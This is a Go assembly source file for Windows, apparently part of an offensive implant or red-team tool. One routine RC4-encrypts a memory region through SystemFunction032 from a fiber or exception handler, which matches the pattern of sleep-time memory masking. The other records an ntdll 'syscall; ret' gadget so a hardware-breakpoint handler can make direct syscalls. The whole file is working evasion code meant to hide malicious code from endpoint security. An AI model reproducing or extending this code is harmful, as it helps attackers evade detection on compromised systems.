//go:build windows && amd64
#include "textflag.h"

// callSystemFunction032Native — invoke advapi32!SystemFunction032 on
// a memory range. Called from native fiber body and VEH handler.
//
// Args (register ABI, since this is called from assembly, not Go):
//   CX = memory base
//   DX = memory length
//   R8 = key pointer
//   R9 = SystemFunction032 address
//
// Precondition: RSP is 16-byte aligned before the CALL.
TEXT ·callSystemFunction032Native(SB), NOSPLIT, $0-0
    // Frame layout, relative to SP after the SUBQ:
    //   [SP+0 .. SP+31]   shadow space for SystemFunction032
    //   [SP+32 .. SP+47]  data USTRING
    //   [SP+48 .. SP+63]  key USTRING
    //   [SP+64 .. SP+71]  padding
    //
    // The frame is 72 bytes, not 48. On entry RSP is 8 mod 16
    // (the CALL from the caller pushed 8 bytes). To make RSP
    // 16-byte aligned before the inner CALL to SystemFunction032,
    // we must subtract a value that is 8 mod 16. 48 is 0 mod 16
    // and leaves RSP misaligned; 72 is 8 mod 16 and aligns it.
    // 72 also reserves the 32 bytes of shadow space the Windows
    // x64 ABI requires the caller to provide for the callee.
    SUBQ  $72, SP

    // data USTRING at [SP+32 .. SP+47].
    MOVL  DX, 32(SP)         // data.Length
    MOVL  DX, 36(SP)         // data.MaximumLength
    MOVQ  CX, 40(SP)         // data.Buffer

    // key USTRING at [SP+48 .. SP+63].
    MOVL  $16, 48(SP)        // key.Length (NativeRC4KeyLen)
    MOVL  $16, 52(SP)        // key.MaximumLength
    MOVQ  R8, 56(SP)         // key.Buffer

    LEAQ  32(SP), CX         // arg1 = &data
    LEAQ  48(SP), DX         // arg2 = &key
    CALL  R9

    ADDQ  $72, SP
    RET

// setSyscallGadgetAddr — called from Go after resolving a
// `syscall; ret` sequence in ntdll. The HWBP handler reads
// syscallGadgetAddr to perform direct syscalls without entering
// the Go runtime. Until this setter runs, syscallGadgetAddr is 0
// and any CALL to it faults.
TEXT ·setSyscallGadgetAddr(SB), NOSPLIT, $0-8
    MOVQ  addr+0(FP), AX
    MOVQ  AX, ·syscallGadgetAddr(SB)
    RET

DATA ·syscallGadgetAddr+0(SB)/8, $0
GLOBL ·syscallGadgetAddr(SB), NOPTR, $8
